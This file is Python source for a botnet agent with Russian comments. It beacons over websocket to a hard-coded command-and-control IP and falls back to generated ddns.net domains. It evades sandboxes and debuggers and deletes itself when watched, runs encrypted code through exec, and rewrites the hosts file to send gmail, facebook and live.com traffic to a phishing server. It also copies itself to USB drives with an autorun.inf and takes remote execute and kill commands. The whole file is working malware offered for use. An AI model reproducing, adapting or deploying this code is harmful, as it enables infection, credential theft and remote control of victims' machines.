import asyncio, websockets, json, platform, os, socket, sys, importlib, random, string, psutil, subprocess, time, hashlib, base64, zlib, secrets, shutil, stat
from utils.logger import log

C2_PRIMARY = '80.249.146.202:8888'
BOT_ID = ''
PLUGIN_DIR = 'agent_plugins'
USB_SPREAD_ENABLED = True

# ---------- DGA ----------
def generate_domains(seed_str, count=5):
    domains = []
    for i in range(count):
        h = hashlib.sha256(f"{seed_str}-{i}".encode()).hexdigest()[:12]
        domains.append(f"{h}.ddns.net")
    return domains

# ---------- Honeypot 2.0 ----------
def detect_honeypot():
    suspicious = False
    # Виртуализация
    try:
        if os.path.exists("/.dockerenv"): suspicious = True
        with open("/proc/cpuinfo") as f:
            if "hypervisor" in f.read().lower(): suspicious = True
    except: pass
    if platform.system() == 'Windows':
        try:
            if os.path.exists("C:\\Sandbox"): suspicious = True
        except: pass
    # Процессы
    suspicious_procs = ['wireshark', 'tcpdump', 'procmon', 'fiddler', 'charles', 'burp', 'vboxservice', 'vmtoolsd', 'xenserver', 'dumpcap']
    for proc in psutil.process_iter(['name']):
        try:
            if proc.info['name'].lower() in suspicious_procs:
                suspicious = True
                break
        except: pass
    # Порты honeypot
    honeypot_ports = [12345, 31337, 4444, 5555, 6666]
    for port in honeypot_ports:
        try:
            s = socket.socket()
            s.settimeout(0.5)
            s.connect(("127.0.0.1", port))
            s.close()
            suspicious = True
            break
        except: pass
    # Проверка на отладку
    if sys.gettrace() is not None:
        suspicious = True
    if suspicious:
        log("[Agent] Honeypot/sandbox detected, self-destruct")
        try: os.remove(__file__)
        except: pass
        sys.exit(0)

# ---------- Полиморфизм 2.0 ----------
def polymorphic_layer():
    # Генерируем уникальное имя для файла данных
    unique_id = secrets.token_hex(8)
    key = secrets.token_bytes(32)
    cipher = AES.new(key, AES.MODE_GCM)
    # Зашифрованный код (здесь может быть любой функционал)
    payload = b"print('Agent polymorphic core active')"
    ciphertext, tag = cipher.encrypt_and_digest(payload)
    with open(f'encrypted_{unique_id}.dat', 'wb') as f:
        f.write(cipher.nonce + tag + ciphertext)
    # Расшифровываем и выполняем
    with open(f'encrypted_{unique_id}.dat', 'rb') as f:
        nonce = f.read(16)
        tag = f.read(16)
        ct = f.read()
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    pt = cipher.decrypt_and_verify(ct, tag)
    exec(pt.decode())

# ---------- Фишинг-инжектор ----------
def phishing_injector():
    # Модификация hosts-файла для перехвата популярных доменов
    hosts_path = "/etc/hosts" if platform.system() == "Linux" else "C:\\Windows\\System32\\drivers\\etc\\hosts"
    phishing_domains = {
        "gmail.com": "192.168.1.100",  # заменить на IP фишинг-сервера
        "facebook.com": "192.168.1.100",
        "live.com": "192.168.1.100"
    }
    try:
        with open(hosts_path, "r+") as hosts:
            content = hosts.read()
            for domain, ip in phishing_domains.items():
                entry = f"{ip} {domain}\n"
                if entry not in content:
                    hosts.write(entry)
        log("[Agent] Phishing hosts injected")
    except Exception as e:
        log(f"[Agent] Phishing injector failed: {e}")

# ---------- USB Spreader ----------
def spread_via_usb():
    if not USB_SPREAD_ENABLED:
        return
    drives = []
    if platform.system() == "Windows":
        import string
        for letter in string.ascii_uppercase:
            if os.path.exists(f"{letter}:\\") and os.path.ismount(f"{letter}:\\"):
                drives.append(f"{letter}:\\")
    else:
        # Linux/macOS
        for entry in os.listdir("/media/"):
            path = f"/media/{entry}"
            if os.path.ismount(path):
                drives.append(path)
    for drive in drives:
        try:
            agent_path = os.path.join(drive, "System.exe" if platform.system() == "Windows" else ".hidden_agent")
            shutil.copy(__file__, agent_path)
            # Создаём autorun.inf (Windows)
            if platform.system() == "Windows":
                with open(os.path.join(drive, "autorun.inf"), "w") as f:
                    f.write("[AutoRun]\nopen=System.exe\naction=Run system utility")
            log(f"[USB] Агент скопирован на {drive}")
        except Exception as e:
            log(f"[USB] Ошибка распространения на {drive}: {e}")

# ---------- Плагины ----------
def load_plugins():
    plugins = {}
    if not os.path.exists(PLUGIN_DIR): return plugins
    for fname in os.listdir(PLUGIN_DIR):
        if fname.endswith('.py') and fname != '__init__.py':
            modname = fname[:-3]
            try:
                spec = importlib.util.spec_from_file_location(modname, os.path.join(PLUGIN_DIR, fname))
                module = importlib.util.module_from_spec(spec)
                sys.modules[modname] = module
                spec.loader.exec_module(module)
                plugins[modname] = module
            except Exception as e:
                log(f"[Agent] Plugin {modname} error: {e}")
    return plugins

def get_id():
    if platform.system() == 'Linux':
        try:
            with open('/etc/machine-id', 'r') as f:
                return f.read().strip()
        except: pass
    return socket.gethostname()

async def try_connect(host, port):
    uri = f"ws://{host}:{port}"
    try:
        async with websockets.connect(uri) as ws:
            await ws.send(json.dumps({'cmd': 'register', 'bot_id': BOT_ID, 'info': {'os': platform.system(), 'hostname': platform.node()}, 'bandwidth': 10}))
            log(f"[Agent] Connected to {host}:{port}")
            async for msg in ws:
                data = json.loads(msg)
                if data.get('cmd') == 'execute':
                    action = data['data'].get('action')
                    if action == 'spread_usb':
                        spread_via_usb()
                elif data.get('cmd') == 'kill':
                    os.remove(__file__)
                    sys.exit(0)
    except:
        return False
    return True

async def connect():
    global BOT_ID
    BOT_ID = get_id()
    detect_honeypot()
    polymorphic_layer()
    phishing_injector()
    spread_via_usb()
    plugins = load_plugins()
    host, port = C2_PRIMARY.split(':')
    if not await try_connect(host, int(port)):
        domains = generate_domains(BOT_ID)
        for domain in domains:
            if await try_connect(domain, int(port)):
                return
        await asyncio.sleep(60)
        asyncio.ensure_future(connect())

if __name__ == '__main__':
    asyncio.run(connect())
